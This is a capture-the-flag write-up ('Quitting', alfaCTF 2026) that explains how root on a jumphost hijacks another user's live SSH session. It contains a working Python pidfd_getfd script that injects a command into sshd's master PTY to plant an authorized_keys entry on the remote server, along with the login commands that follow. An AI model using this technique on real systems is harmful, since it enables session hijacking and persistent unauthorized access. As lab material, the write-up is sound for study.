# Quitting — alfaCTF 2026

**Category:** Infra / Linux  
**Difficulty:** Medium  
**Tags:** linux, syscalls, pidfd, pty-injection, ssh, lateral-movement  
**Flag:** `alfa{AdmiN_n07_f0UND_bUt_his_keYs_4re_in_5af3_hAnds}`

## Overview

We SSH into a jumphost as user `quitting` and get a root shell. An `admin` user has an active SSH session **from** the jumphost **to** `tracker-prod` — the target server. Our goal is to hijack that session, get onto tracker-prod, and read the flag.

## Recon

After connecting to the jumphost (`root@jumphost`), the running processes tell the story:

```
root   29  sshd: admin [priv]
admin  44  sshd: admin@pts/1
admin  45  sh -c sleep 1 && rm -rf /tmp/ssh* & ssh -l admin tracker-prod bash
admin  47  ssh -l admin tracker-prod bash
```

Key observations:

- `admin` is connected to the jumphost via SSH with **agent forwarding** (`SSH_AUTH_SOCK` is set).
- Their session runs `ssh -l admin tracker-prod bash` — an active SSH connection to `tracker-prod`.
- A sabotage script runs alongside: `sleep 1 && rm -rf /tmp/ssh*` — **deletes the SSH-agent socket** ~1 second after session start. We cannot reuse the agent for new SSH connections.

We confirm:

- `tracker-prod` resolves to `10.0.243.2` (`getent hosts tracker-prod`).
- SSH on tracker-prod requires authentication: `Permission denied (publickey,password)`.
- No other ports open on tracker-prod.
- No private key for `admin` on the jumphost (only `authorized_keys` and `known_hosts`).

## Failed Approaches

1. **TIOCSTI ioctl** — inject keystrokes into admin's TTY (pts/1). Fails because `kernel.legacy_tiocsti` is `0` (disabled), and the filesystem is read-only so we cannot enable it.
2. **Writing to `/proc/PID/fd/N`** where `fd` points at `/dev/pts/ptmx` — this **opens a new PTY master** instead of writing to the existing one. Bytes go nowhere useful.
3. **SSH-agent socket reuse** — deleted by the `rm -rf /tmp/ssh*` script within ~1 s of session start. Socket file is gone before we can `connect()`.
4. **Password bruteforce** — neither CTF credentials nor common passwords work.
5. **gdb / nc / socat** — not available on the minimal container.

## Solution: `pidfd_getfd()`

Insight: we need to write to sshd's **actual master-PTY file descriptor** — not open `/dev/pts/ptmx`, which creates a new PTY pair.

The Linux syscall `pidfd_getfd()` (kernel ≥ 5.6) duplicates a file descriptor from another process **without re-opening the underlying file**. As root we have the required `PTRACE_MODE_ATTACH_REALCREDS` permission.

**Step 1 — generate a fresh keypair on the jumphost:**

```bash
ssh-keygen -t ed25519 -f /tmp/mykey -N ""
```

**Step 2 — duplicate sshd's master-PTY fd and write a command line into it:**

```python
import ctypes, os

libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.syscall.restype = ctypes.c_long

SYS_pidfd_open  = 434  # x86_64
SYS_pidfd_getfd = 438

sshd_pid = 29  # sshd: admin [priv] — holds master PTY at fd 3

pidfd     = libc.syscall(SYS_pidfd_open, ctypes.c_int(sshd_pid), ctypes.c_int(0))
master_fd = libc.syscall(SYS_pidfd_getfd, ctypes.c_int(pidfd), ctypes.c_int(3), ctypes.c_int(0))

pubkey = open('/tmp/mykey.pub').read().strip()
cmd    = f'\nmkdir -p ~/.ssh; echo "{pubkey}" >> ~/.ssh/authorized_keys\n'.encode()
os.write(master_fd, cmd)
```

How the bytes travel:

- Writing to the master PTY puts characters into pts/1's input queue.
- The `ssh` client (PID 47) reads from pts/1 as its stdin.
- It forwards them through the SSH channel to tracker-prod's `bash`.
- Tracker-prod's bash executes `mkdir -p ~/.ssh; echo "..." >> ~/.ssh/authorized_keys`.

**Step 3 — log in directly with the planted key:**

```bash
ssh -i /tmp/mykey admin@tracker-prod 'cat /home/admin/flag.txt'
```

## Flag

`alfa{AdmiN_n07_f0UND_bUt_his_keYs_4re_in_5af3_hAnds}`

## Files

Solver scripts: [`artifacts/`](artifacts/)

| File | Role |
|------|------|
| `inject.sh` | Working solver — `pidfd_getfd()` duplicates sshd's master-PTY fd and writes the `authorized_keys` install command into the `admin` session, then SSH-logs in with the planted key |
| `inject2.sh` | Failed earlier approach — writing to `/proc/PID/fd/N` for `ptmx` creates a *new* PTY pair instead of reaching the existing one (kept as the documented dead end) |
